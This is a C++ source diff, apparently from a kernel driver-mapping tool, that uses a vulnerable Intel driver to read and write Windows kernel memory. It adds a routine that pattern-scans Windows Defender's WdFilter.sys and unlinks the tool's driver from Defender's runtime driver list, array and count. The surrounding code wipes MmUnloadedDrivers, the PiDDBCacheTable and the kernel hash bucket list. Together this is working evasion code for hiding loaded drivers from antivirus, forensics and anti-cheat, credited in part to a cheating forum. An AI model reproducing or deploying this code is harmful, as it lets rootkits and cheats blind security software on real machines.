@@ -102,7 +102,118 @@ HANDLE intel_driver::Load() {
 		return INVALID_HANDLE_VALUE;
 	}
 
+	if (!intel_driver::ClearWdFilterDriverList(result)) {
+		Log("[!] Failed to ClearWdFilterDriverList" << std::endl);
+		intel_driver::Unload(result);
+		return INVALID_HANDLE_VALUE;
+	}
+
 	return result;
+}
+
+bool intel_driver::ClearWdFilterDriverList(HANDLE device_handle) {
+
+	auto WdFilter = utils::GetKernelModuleAddress("WdFilter.sys");
+	if (!WdFilter) {
+		Log("[+] WdFilter.sys not loaded, clear skipped" << std::endl);
+		return true;
+	}
+
+	auto RuntimeDriversList = FindPatternInSectionAtKernel(device_handle, "PAGE", WdFilter, (PUCHAR)"\x48\x8B\x0D\x00\x00\x00\x00\xFF\x05", "xxx????xx");
+	if (!RuntimeDriversList) {
+		Log("[!] Failed to find WdFilter RuntimeDriversList" << std::endl);
+		return false;
+	}
+
+	auto RuntimeDriversCountRef = FindPatternInSectionAtKernel(device_handle, "PAGE", WdFilter, (PUCHAR)"\xFF\x05\x00\x00\x00\x00\x48\x39\x11", "xx????xxx");
+	if (!RuntimeDriversCountRef) {
+		Log("[!] Failed to find WdFilter RuntimeDriversCount" << std::endl);
+		return false;
+	}
+
+	auto MpFreeDriverInfoExRef = FindPatternInSectionAtKernel(device_handle, "PAGE", WdFilter, (PUCHAR)"\x49\x8B\xC9\x00\x89\x00\x08\xE8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xE9", "xxx?x?xx???????????x");
+	if (!MpFreeDriverInfoExRef) {
+		Log("[!] Failed to find WdFilter MpFreeDriverInfoEx" << std::endl);
+		return false;
+	}
+
+	MpFreeDriverInfoExRef += 0x7; // skip until call instruction
+
+	RuntimeDriversList = (uintptr_t)ResolveRelativeAddress(device_handle, (PVOID)RuntimeDriversList, 3, 7);
+	uintptr_t RuntimeDriversList_Head = RuntimeDriversList - 0x8;
+	uintptr_t RuntimeDriversCount = (uintptr_t)ResolveRelativeAddress(device_handle, (PVOID)RuntimeDriversCountRef, 2, 6);
+	uintptr_t RuntimeDriversArray = RuntimeDriversCount + 0x8;
+	ReadMemory(device_handle, RuntimeDriversArray, &RuntimeDriversArray, sizeof(uintptr_t));
+	uintptr_t MpFreeDriverInfoEx = (uintptr_t)ResolveRelativeAddress(device_handle, (PVOID)MpFreeDriverInfoExRef, 1, 5);
+
+	auto ReadListEntry = [&](uintptr_t Address) -> LIST_ENTRY* { // Usefull lambda to read LIST_ENTRY
+		LIST_ENTRY* Entry;
+		if (!ReadMemory(device_handle, Address, &Entry, sizeof(LIST_ENTRY*))) return 0;
+		return Entry;
+	};
+
+	for (LIST_ENTRY* Entry = ReadListEntry(RuntimeDriversList_Head);
+		Entry != (LIST_ENTRY*)RuntimeDriversList_Head;
+		Entry = ReadListEntry((uintptr_t)Entry + (offsetof(struct _LIST_ENTRY, Flink))))
+	{
+		UNICODE_STRING Unicode_String;
+		if (ReadMemory(device_handle, (uintptr_t)Entry + 0x10, &Unicode_String, sizeof(UNICODE_STRING))) {
+			auto ImageName = std::make_unique<wchar_t[]>((ULONG64)Unicode_String.Length / 2ULL + 1ULL);
+			if (ReadMemory(device_handle, (uintptr_t)Unicode_String.Buffer, ImageName.get(), Unicode_String.Length)) {
+				if (wcsstr(ImageName.get(), intel_driver::GetDriverNameW().c_str())) {
+
+					//remove from RuntimeDriversArray
+					bool removedRuntimeDriversArray = false;
+					PVOID SameIndexList = (PVOID)((uintptr_t)Entry - 0x10);
+					for (int k = 0; k < 256; k++) { // max RuntimeDriversArray elements
+						PVOID value = 0;
+						ReadMemory(device_handle, RuntimeDriversArray + (k * 8), &value, sizeof(PVOID));
+						if (value == SameIndexList) {
+							PVOID emptyval = (PVOID)(RuntimeDriversCount + 1); // this is not count+1 is position of cout addr+1
+							WriteMemory(device_handle, RuntimeDriversArray + (k * 8), &emptyval, sizeof(PVOID));
+							removedRuntimeDriversArray = true;
+							break;
+						}
+					}
+
+					if (!removedRuntimeDriversArray) {
+						Log("[!] Failed to remove from RuntimeDriversArray" << std::endl);
+						return false;
+					}
+
+					auto NextEntry = ReadListEntry(uintptr_t(Entry) + (offsetof(struct _LIST_ENTRY, Flink)));
+					auto PrevEntry = ReadListEntry(uintptr_t(Entry) + (offsetof(struct _LIST_ENTRY, Blink)));
+
+					WriteMemory(device_handle, uintptr_t(NextEntry) + (offsetof(struct _LIST_ENTRY, Blink)), &PrevEntry, sizeof(LIST_ENTRY::Blink));
+					WriteMemory(device_handle, uintptr_t(PrevEntry) + (offsetof(struct _LIST_ENTRY, Flink)), &NextEntry, sizeof(LIST_ENTRY::Flink));
+
+
+					// decrement RuntimeDriversCount
+					ULONG current = 0;
+					ReadMemory(device_handle, RuntimeDriversCount, &current, sizeof(ULONG));
+					current--;
+					WriteMemory(device_handle, RuntimeDriversCount, &current, sizeof(ULONG));
+
+					// call MpFreeDriverInfoEx
+					uintptr_t DriverInfo = (uintptr_t)Entry - 0x20;
+
+					//verify DriverInfo Magic
+					USHORT Magic = 0;
+					ReadMemory(device_handle, DriverInfo, &Magic, sizeof(USHORT));
+					if (Magic != 0xDA18) {
+						Log("[!] DriverInfo Magic is invalid, new wdfilter version?, driver info will not be released to prevent bsod" << std::endl);
+					}
+					else {
+						CallKernelFunction<void>(device_handle, nullptr, MpFreeDriverInfoEx, DriverInfo);
+					}
+
+					Log("[+] WdFilterDriverList Cleaned: " << ImageName << std::endl);
+					return true;
+				}
+			}
+		}
+	}
+	return false;
 }
 
 bool intel_driver::Unload(HANDLE device_handle) {
@@ -295,7 +406,7 @@ bool intel_driver::MmFreeIndependentPages(HANDLE device_handle, uint64_t address
 
 	if (!kernel_MmFreeIndependentPages)
 	{
-		kernel_MmFreeIndependentPages = intel_driver::FindPatternInSectionAtKernel(device_handle, (char*)"PAGE", intel_driver::ntoskrnlAddr, 
+		kernel_MmFreeIndependentPages = intel_driver::FindPatternInSectionAtKernel(device_handle, "PAGE", intel_driver::ntoskrnlAddr, 
 			(BYTE*)"\xBA\x00\x60\x00\x00\x48\x8B\xCB\xE8\x00\x00\x00\x00\x48\x8D\x8B\x00\xF0\xFF\xFF", 
 			(char*)"xxxxxxxxx????xxxxxxx");
 		if (!kernel_MmFreeIndependentPages) {
@@ -328,7 +439,7 @@ BOOLEAN intel_driver::MmSetPageProtection(HANDLE device_handle, uint64_t address
 	
 	if (!kernel_MmSetPageProtection)
 	{
-		kernel_MmSetPageProtection = intel_driver::FindPatternInSectionAtKernel(device_handle, (char*)"PAGE", intel_driver::ntoskrnlAddr, 
+		kernel_MmSetPageProtection = intel_driver::FindPatternInSectionAtKernel(device_handle, "PAGE", intel_driver::ntoskrnlAddr, 
 			(BYTE*)"\x41\xB8\x00\x00\x00\x00\x48\x00\x00\x00\x8B\x00\xE8\x00\x00\x00\x00\x84\xC0\x74\x09\x48\x81\xEB\x00\x00\x00\x00\xEB", 
 			(char*)"xx????x???x?x????xxxxxxx????x");
 		if (!kernel_MmSetPageProtection) {
@@ -598,10 +709,8 @@ bool intel_driver::ClearMmUnloadedDrivers(HANDLE device_handle) {
 		return false;
 	}
 
-	wchar_t* unloadedName = new wchar_t[(ULONG64)us_driver_base_dll_name.Length / 2ULL + 1ULL];
-	memset(unloadedName, 0, us_driver_base_dll_name.Length + sizeof(wchar_t));
-
-	if (!ReadMemory(device_handle, (uintptr_t)us_driver_base_dll_name.Buffer, unloadedName, us_driver_base_dll_name.Length)) {
+	auto unloadedName = std::make_unique<wchar_t[]>((ULONG64)us_driver_base_dll_name.Length / 2ULL + 1ULL);
+	if (!ReadMemory(device_handle, (uintptr_t)us_driver_base_dll_name.Buffer, unloadedName.get(), us_driver_base_dll_name.Length)) {
 		Log(L"[!] Failed to read driver name" << std::endl);
 		return false;
 	}
@@ -614,9 +723,6 @@ bool intel_driver::ClearMmUnloadedDrivers(HANDLE device_handle) {
 	}
 
 	Log(L"[+] MmUnloadedDrivers Cleaned: " << unloadedName << std::endl);
-
-	delete[] unloadedName;
-
 	return true;
 }
 
@@ -709,11 +815,11 @@ intel_driver::PiDDBCacheEntry* intel_driver::LookupEntry(HANDLE device_handle, P
 
 bool intel_driver::ClearPiDDBCacheTable(HANDLE device_handle) { //PiDDBCacheTable added on LoadDriver
 
-	PiDDBLockPtr = FindPatternInSectionAtKernel(device_handle, (char*)"PAGE", intel_driver::ntoskrnlAddr, (PUCHAR)"\x8B\xD8\x85\xC0\x0F\x88\x00\x00\x00\x00\x65\x48\x8B\x04\x25\x00\x00\x00\x00\x66\xFF\x88\x00\x00\x00\x00\xB2\x01\x48\x8D\x0D\x00\x00\x00\x00\xE8\x00\x00\x00\x00\x4C\x8B\x00\x24", (char*)"xxxxxx????xxxxx????xxx????xxxxx????x????xx?x"); // 8B D8 85 C0 0F 88 ? ? ? ? 65 48 8B 04 25 ? ? ? ? 66 FF 88 ? ? ? ? B2 01 48 8D 0D ? ? ? ? E8 ? ? ? ? 4C 8B ? 24 update for build 22000.132
-	PiDDBCacheTablePtr = FindPatternInSectionAtKernel(device_handle, (char*)"PAGE", intel_driver::ntoskrnlAddr, (PUCHAR)"\x66\x03\xD2\x48\x8D\x0D", (char*)"xxxxxx"); // 66 03 D2 48 8D 0D
+	PiDDBLockPtr = FindPatternInSectionAtKernel(device_handle, "PAGE", intel_driver::ntoskrnlAddr, (PUCHAR)"\x8B\xD8\x85\xC0\x0F\x88\x00\x00\x00\x00\x65\x48\x8B\x04\x25\x00\x00\x00\x00\x66\xFF\x88\x00\x00\x00\x00\xB2\x01\x48\x8D\x0D\x00\x00\x00\x00\xE8\x00\x00\x00\x00\x4C\x8B\x00\x24", "xxxxxx????xxxxx????xxx????xxxxx????x????xx?x"); // 8B D8 85 C0 0F 88 ? ? ? ? 65 48 8B 04 25 ? ? ? ? 66 FF 88 ? ? ? ? B2 01 48 8D 0D ? ? ? ? E8 ? ? ? ? 4C 8B ? 24 update for build 22000.132
+	PiDDBCacheTablePtr = FindPatternInSectionAtKernel(device_handle, "PAGE", intel_driver::ntoskrnlAddr, (PUCHAR)"\x66\x03\xD2\x48\x8D\x0D", "xxxxxx"); // 66 03 D2 48 8D 0D
 
 	if (PiDDBLockPtr == NULL) { // PiDDBLock pattern changes a lot from version 1607 of windows and we will need a second pattern if we want to keep simple as posible
-		PiDDBLockPtr = FindPatternInSectionAtKernel(device_handle, (char*)"PAGE", intel_driver::ntoskrnlAddr, (PUCHAR)"\x48\x8B\x0D\x00\x00\x00\x00\x48\x85\xC9\x0F\x85\x00\x00\x00\x00\x48\x8D\x0D\x00\x00\x00\x00\xE8\x00\x00\x00\x00\xE8", (char*)"xxx????xxxxx????xxx????x????x"); // 48 8B 0D ? ? ? ? 48 85 C9 0F 85 ? ? ? ? 48 8D 0D ? ? ? ? E8 ? ? ? ? E8 build 22449+ (pattern can be improved but just fine for now)
+		PiDDBLockPtr = FindPatternInSectionAtKernel(device_handle, "PAGE", intel_driver::ntoskrnlAddr, (PUCHAR)"\x48\x8B\x0D\x00\x00\x00\x00\x48\x85\xC9\x0F\x85\x00\x00\x00\x00\x48\x8D\x0D\x00\x00\x00\x00\xE8\x00\x00\x00\x00\xE8", "xxx????xxxxx????xxx????x????x"); // 48 8B 0D ? ? ? ? 48 85 C9 0F 85 ? ? ? ? 48 8D 0D ? ? ? ? E8 ? ? ? ? E8 build 22449+ (pattern can be improved but just fine for now)
 		if (PiDDBLockPtr == NULL) {
 			Log(L"[-] Warning PiDDBLock not found" << std::endl);
 			return false;
@@ -804,7 +910,7 @@ bool intel_driver::ClearPiDDBCacheTable(HANDLE device_handle) { //PiDDBCacheTabl
 	return true;
 }
 
-uintptr_t intel_driver::FindPatternAtKernel(HANDLE device_handle, uintptr_t dwAddress, uintptr_t dwLen, BYTE* bMask, char* szMask) {
+uintptr_t intel_driver::FindPatternAtKernel(HANDLE device_handle, uintptr_t dwAddress, uintptr_t dwLen, BYTE* bMask, const char* szMask) {
 	if (!dwAddress) {
 		Log(L"[-] No module address to find pattern" << std::endl);
 		return 0;
@@ -815,25 +921,23 @@ uintptr_t intel_driver::FindPatternAtKernel(HANDLE device_handle, uintptr_t dwAd
 		return 0;
 	}
 
-	BYTE* sectionData = new BYTE[dwLen];
-	if (!ReadMemory(device_handle, dwAddress, sectionData, dwLen)) {
+	auto sectionData = std::make_unique<BYTE[]>(dwLen);
+	if (!ReadMemory(device_handle, dwAddress, sectionData.get(), dwLen)) {
 		Log(L"[-] Read failed in FindPatternAtKernel" << std::endl);
 		return 0;
 	}
 
-	auto result = utils::FindPattern((uintptr_t)sectionData, dwLen, bMask, szMask);
+	auto result = utils::FindPattern((uintptr_t)sectionData.get(), dwLen, bMask, szMask);
 
 	if (result <= 0) {
 		Log(L"[-] Can't find pattern" << std::endl);
-		delete[] sectionData;
 		return 0;
 	}
-	result = dwAddress - (uintptr_t)sectionData + result;
-	delete[] sectionData;
+	result = dwAddress - (uintptr_t)sectionData.get() + result;
 	return result;
 }
 
-uintptr_t intel_driver::FindSectionAtKernel(HANDLE device_handle, char* sectionName, uintptr_t modulePtr, PULONG size) {
+uintptr_t intel_driver::FindSectionAtKernel(HANDLE device_handle, const char* sectionName, uintptr_t modulePtr, PULONG size) {
 	if (!modulePtr)
 		return 0;
 	BYTE headers[0x1000];
@@ -852,7 +956,7 @@ uintptr_t intel_driver::FindSectionAtKernel(HANDLE device_handle, char* sectionN
 	return section - (uintptr_t)headers + modulePtr;
 }
 
-uintptr_t intel_driver::FindPatternInSectionAtKernel(HANDLE device_handle, char* sectionName, uintptr_t modulePtr, BYTE* bMask, char* szMask) {
+uintptr_t intel_driver::FindPatternInSectionAtKernel(HANDLE device_handle, const char* sectionName, uintptr_t modulePtr, BYTE* bMask, const char* szMask) {
 	ULONG sectionSize = 0;
 	uintptr_t section = FindSectionAtKernel(device_handle, sectionName, modulePtr, &sectionSize);
 	return FindPatternAtKernel(device_handle, section, sectionSize, bMask, szMask);
@@ -866,12 +970,12 @@ bool intel_driver::ClearKernelHashBucketList(HANDLE device_handle) {
 	}
 
 	//Thanks @KDIo3 and @Swiftik from UnknownCheats
-	auto sig = FindPatternInSectionAtKernel(device_handle, (char*)"PAGE", ci, PUCHAR("\x48\x8B\x1D\x00\x00\x00\x00\xEB\x00\xF7\x43\x40\x00\x20\x00\x00"), (char*)"xxx????x?xxxxxxx");
+	auto sig = FindPatternInSectionAtKernel(device_handle, "PAGE", ci, PUCHAR("\x48\x8B\x1D\x00\x00\x00\x00\xEB\x00\xF7\x43\x40\x00\x20\x00\x00"), "xxx????x?xxxxxxx");
 	if (!sig) {
 		Log(L"[-] Can't Find g_KernelHashBucketList" << std::endl);
 		return false;
 	}
-	auto sig2 = FindPatternAtKernel(device_handle, (uintptr_t)sig - 50, 50, PUCHAR("\x48\x8D\x0D"), (char*)"xxx");
+	auto sig2 = FindPatternAtKernel(device_handle, (uintptr_t)sig - 50, 50, PUCHAR("\x48\x8D\x0D"), "xxx");
 	if (!sig2) {
 		Log(L"[-] Can't Find g_HashCacheLock" << std::endl);
 		return false;
@@ -934,10 +1038,8 @@ bool intel_driver::ClearKernelHashBucketList(HANDLE device_handle) {
 				return false;
 			}
 
-			wchar_t* wsName = new wchar_t[(ULONG64)wsNameLen / 2ULL + 1ULL];
-			memset(wsName, 0, wsNameLen + sizeof(wchar_t));
-
-			if (!ReadMemory(device_handle, (uintptr_t)wsNamePtr, wsName, wsNameLen)) {
+			auto wsName = std::make_unique<wchar_t[]>((ULONG64)wsNameLen / 2ULL + 1ULL);
+			if (!ReadMemory(device_handle, (uintptr_t)wsNamePtr, wsName.get(), wsNameLen)) {
 				Log(L"[-] Failed to read g_KernelHashBucketList entry text!" << std::endl);
 				if (!ExReleaseResourceLite(device_handle, g_HashCacheLock)) {
 					Log(L"[-] Failed to release g_KernelHashBucketList lock!" << std::endl);
@@ -945,7 +1047,7 @@ bool intel_driver::ClearKernelHashBucketList(HANDLE device_handle) {
 				return false;
 			}
 
-			size_t find_result = std::wstring(wsName).find(wdname);
+			size_t find_result = std::wstring(wsName.get()).find(wdname);
 			if (find_result != std::wstring::npos) {
 				Log(L"[+] Found In g_KernelHashBucketList: " << std::wstring(&wsName[find_result]) << std::endl);
 				HashBucketEntry* Next = 0;
@@ -980,10 +1082,8 @@ bool intel_driver::ClearKernelHashBucketList(HANDLE device_handle) {
 					}
 					return false;
 				}
-				delete[] wsName;
 				return true;
 			}
-			delete[] wsName;
 		}
 		prev = entry;
 		//read next
